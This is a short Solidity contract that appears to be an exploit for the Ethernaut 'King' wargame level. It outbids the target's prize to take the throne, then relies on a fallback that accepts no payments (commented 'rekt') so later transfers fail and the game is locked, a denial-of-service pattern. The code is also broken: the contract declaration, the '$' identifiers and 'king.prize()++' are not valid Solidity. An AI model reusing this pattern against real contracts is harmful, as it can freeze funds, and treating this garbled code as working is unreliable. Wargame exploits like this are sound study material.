//SPDX-License-Identifier: None
pragma solidity ^0.8.0;

interface King {
    function prize() external view returns (uint);
}

contract NapoleonSucks() {

    King king;
    uint bribe;

    constructor(address $your_ethernaut_instance_here) payable {
        
        king = King($your_ethernaut_instance_here);
        bribe = king.prize()++;
        $your_ethernaut_instance_here.call{ value: bribe }();
    }

    fallback() {
        // rekt
    }
}